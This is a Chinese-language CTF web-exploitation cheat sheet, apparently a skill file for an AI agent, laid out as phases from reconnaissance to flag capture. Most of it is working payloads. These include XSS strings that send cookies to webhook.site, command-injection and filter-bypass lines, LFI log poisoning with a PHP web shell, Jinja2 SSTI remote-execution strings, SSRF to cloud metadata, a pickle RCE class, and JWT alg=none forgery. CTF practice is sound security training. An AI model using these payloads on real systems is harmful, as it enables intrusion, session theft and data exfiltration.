# CTF WEB 子技能

## 总体流程

```
信息收集 → 指纹识别 → 漏洞探测 → 漏洞利用 → 权限提升 → 获取 flag
```

---

## Phase 1：信息收集

```bash
# 基础探测
curl -sI 'http://target/'                          # 响应头（框架、服务器）
curl -s 'http://target/robots.txt'
curl -s 'http://target/.git/HEAD'                  # Git 泄露
curl -s 'http://target/phpinfo.php'
curl -s 'http://target/admin' 'http://target/backup' 'http://target/source'

# 目录爆破（需安装）
pip install dirsearch --break-system-packages 2>/dev/null
python3 -m dirsearch -u http://target/ -e php,py,js,txt,bak

# 参数/接口发现
# 观察页面 JS、HTML 注释、hidden input
```

**重点关注**：
- 备份文件：`.bak`, `.swp`, `~`, `source.zip`
- 版本控制：`.git/`, `.svn/`, `.hg/`
- 配置文件：`config.php`, `.env`, `web.config`
- 错误信息暴露（堆栈跟踪、路径）

---

## Phase 2：漏洞类型判断与利用

### 2.1 SQL 注入

**检测**：
```
' OR 1=1--
" OR "1"="1
1' AND sleep(5)--
```

**利用**（优先 sqlmap）：
```bash
pip install sqlmap --break-system-packages 2>/dev/null
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump --batch
# POST 参数
sqlmap -u "http://target/login" --data="user=admin&pass=test" --dbs --batch
```

**盲注手工**：
```python
import requests
# Boolean-based
for i in range(1, 50):
    r = requests.get(f"http://target/?id=1' AND (SELECT SUBSTR(flag,{i},1) FROM flags)='a'--")
```

**常见 flag 位置**：`flag` 表、`secret` 表、`users.password` 字段

---

### 2.2 XSS（Cross-Site Scripting）

CTF 中 XSS 通常需要偷 admin 的 cookie/token：

```javascript
// Payload 示例
<script>fetch('https://webhook.site/YOUR_ID?c='+document.cookie)</script>
<img src=x onerror="fetch('https://webhook.site/YOUR_ID?c='+btoa(document.cookie))">
// 绕过过滤
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=eval(atob('YWxlcnQoMSk='))>
```

**工具**：使用 [webhook.site](https://webhook.site) 或 Burp Collaborator 接收外带数据

---

### 2.3 命令注入 / RCE

```python
# 检测
payloads = [
    "; ls",  "| ls",  "` ls `",  "$(ls)",
    "; cat /flag",  "; cat /flag.txt",  "; find / -name flag* 2>/dev/null",
]

import requests
for p in payloads:
    r = requests.post("http://target/", data={"cmd": p})
    if "flag" in r.text or "root" in r.text:
        print(r.text)
```

**常见绕过**：
```bash
# 空格绕过
cat${IFS}/flag
cat</flag
{cat,/flag}
# 关键词绕过
c\at /flag
ca''t /flag
# 编码绕过
echo 'Y2F0IC9mbGFn' | base64 -d | bash
```

---

### 2.4 文件包含（LFI / RFI）

```bash
# LFI 基础路径穿越
/page?file=../../../../etc/passwd
/page?file=....//....//etc/passwd
/page?file=php://filter/convert.base64-encode/resource=index.php

# 读取 flag
/page?file=../../../../flag
/page?file=../../../../flag.txt

# 日志投毒 → RCE
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
/page?file=../../../../var/log/apache2/access.log&cmd=cat+/flag
```

**PHP Wrapper 利用**：
```
php://filter/read=convert.base64-encode/resource=config.php
php://input   (配合 POST 数据)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

---

### 2.5 SSTI（服务端模板注入）

```python
# 检测 payload（数学表达式）
{{7*7}}          # 输出 49 → Jinja2/Twig
${7*7}           # FreeMarker/Velocity
<%= 7*7 %>       # ERB (Ruby)
#{7*7}           # Pebble/Thymeleaf

# Jinja2 RCE（Python）
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/flag').read()}}
# 沙箱逃逸
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c()._module.__builtins__['__import__']('os').popen('id').read() }}
  {% endif %}
{% endfor %}
```

---

### 2.6 SSRF（服务端请求伪造）

```
# 内网探测
http://127.0.0.1/flag
http://localhost/admin
http://169.254.169.254/latest/meta-data/  (AWS 元数据)
http://192.168.0.1/

# 协议绕过
dict://127.0.0.1:6379/    (Redis)
file:///etc/passwd
gopher://127.0.0.1:80/_GET /flag HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0a%0d%0a
```

---

### 2.7 反序列化

```php
# PHP 反序列化魔术方法触发链
# 工具：phpggc
pip install phpggc 2>/dev/null || git clone https://github.com/ambionics/phpggc
./phpggc -l   # 查看可用 gadget chain
./phpggc Laravel/RCE1 system "cat /flag"

# Python pickle
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /flag > /tmp/flag.txt',))
import base64; print(base64.b64encode(pickle.dumps(Exploit())))
```

---

### 2.8 JWT 攻击

```python
import jwt, base64, json

# 解码（不验证）
token = "eyJ..."
header = json.loads(base64.b64decode(token.split('.')[0] + '=='))
payload = json.loads(base64.b64decode(token.split('.')[1] + '=='))
print(header, payload)

# 攻击1：alg=none
forged = jwt.encode(payload, "", algorithm="none")

# 攻击2：弱密钥爆破
pip install jwt-cracker 2>/dev/null
# 攻击3：RSA→HMAC（公钥当对称密钥）
```

---

### 2.9 路径穿越 / 任意文件读取

```
../../etc/passwd
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
%2e%2e/%2e%2e/etc/passwd
```

**目标文件**：
- `/flag`, `/flag.txt`, `/root/flag`, `/home/*/flag`
- `/proc/self/environ`（环境变量，可能含 flag）
- `/app/flag`, `/var/www/html/flag`

---

## Phase 3：自动化脚本模板

```python
#!/usr/bin/env python3
import requests
import re

TARGET = "http://challenge.example.com"
session = requests.Session()

def exploit():
    # 修改此处放入具体利用逻辑
    r = session.get(f"{TARGET}/flag")
    flag = re.search(r'flag\{[^}]+\}', r.text)
    if flag:
        print(f"[+] FLAG: {flag.group()}")
    else:
        print(r.text[:500])

if __name__ == "__main__":
    exploit()
```

---

## 常用资源

- `web_search`: "<题目关键词> CTF writeup"
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz
